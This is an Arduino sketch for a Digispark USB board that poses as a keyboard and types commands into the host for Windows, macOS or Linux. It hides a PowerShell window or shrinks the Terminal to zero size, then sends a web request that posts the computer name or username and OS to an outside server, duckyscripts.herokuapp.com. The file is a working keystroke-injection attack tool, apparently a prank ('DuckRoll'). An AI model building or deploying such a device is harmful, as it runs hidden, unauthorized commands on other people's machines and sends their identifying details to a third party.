// DO NOT CHANGE
#include "DigiKeyboard.h"

#define KEY_TAB 0x2B
#define Windows 1
#define macOS   2
#define Linux   3
// END DO NOT CHANGE

// CHANGE
#define OS macOS
#define script "DuckRoll"
// END CHANGE

// REST OF THE SCRIPT, DO NOT CHANGE
void setup() {
    pinMode(1, OUTPUT);
    DigiKeyboard.delay(750);

    #if (OS == Windows)
        DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
        DigiKeyboard.delay(200);
        DigiKeyboard.println("powershell -W h");
        DigiKeyboard.delay(1000);

        DigiKeyboard.println("iwr -useb duckyscripts.herokuapp.com/register -Me POST -Co application/json -B @\" ");
        DigiKeyboard.print("{\" os\":\"Windows\",\"script\":\"");
        DigiKeyboard.print(script);
        DigiKeyboard.println("\",\"name\":\"$env:COMPUTERNAME\"}\n\"@");

    #elif (OS == macOS)
        DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
        DigiKeyboard.delay(200);
        DigiKeyboard.println("terminal");
        DigiKeyboard.delay(750);

        DigiKeyboard.println("osascript -e 'tell app \"Terminal\" to set size of window 0 to {0,0}' ");
        DigiKeyboard.print("curl duckyscripts.herokuapp.com/register -X POST -H \"Content-Type: application/json\"  -d '{ \" os\":\"macOS\",\"script\":\"");
        DigiKeyboard.print(script);
        DigiKeyboard.println("\",\"name\":\"'\"$(whoami)\"'\"}' ");

    #elif (OS == Linux)
        DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_CONTROL_LEFT | MOD_ALT_LEFT);
        DigiKeyboard.delay(1000);

        DigiKeyboard.print("curl duckyscripts.herokuapp.com/register -X POST -H \"Content-Type: application/json\"  -d '{ \" os\":\"Linux\",\"script\":\"");
        DigiKeyboard.print(script);
        DigiKeyboard.println("\",\"name\":\"'\"$(whoami)\"'\"}' ");
        
    #else
        #error Invalid OS, use either "Windows", "macOS" or "Linux".
    #endif
        
    DigiKeyboard.delay(100);
    digitalWrite(1, HIGH);
}

void loop() {} // Nothing